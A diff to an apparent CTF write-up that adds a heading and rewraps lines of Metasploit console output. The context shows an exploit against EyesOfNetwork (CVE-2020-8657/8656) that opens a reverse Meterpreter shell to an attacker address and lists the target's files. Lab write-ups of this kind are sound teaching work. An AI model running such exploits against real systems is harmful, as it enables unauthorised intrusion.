@@ -1,4 +1,5 @@
 \clearpage
+# CTF
 ## CTF 01
 
 > Capture The Flag.
@@ -131,12 +132,14 @@ msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > exploit
 [*] Started reverse TCP handler on 192.168.9.5:1337 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Target is EyesOfNetwork 5.3 or older with API version 2.4.2.
-[*] Target is EyesOfNetwork version 5.3 or later. Attempting exploitation using CVE-2020-8657 or CVE-2020-8656.
+[*] Target is EyesOfNetwork version 5.3 or later. Attempting exploitation using
+	CVE-2020-8657 or CVE-2020-8656.
 [*] Using generated API key: 41a41f52395de8a08c2de5e1e80ab6f47f5655a53738ec9848f52171143e90d3
 [+] Authenticated as user hwAENgHt
 [*] Command Stager progress - 100.00% done (897/897 bytes)
 [*] Sending stage (3020772 bytes) to 192.168.10.18
-[*] Meterpreter session 1 opened (192.168.9.5:1337 -> 192.168.10.18:51476 ) at 2022-06-13 17:12:54 +0200
+[*] Meterpreter session 1 opened (192.168.9.5:1337 -> 192.168.10.18:51476 ) at
+	2022-06-13 17:12:54 +0200
 
 meterpreter > ls /
 Listing: /
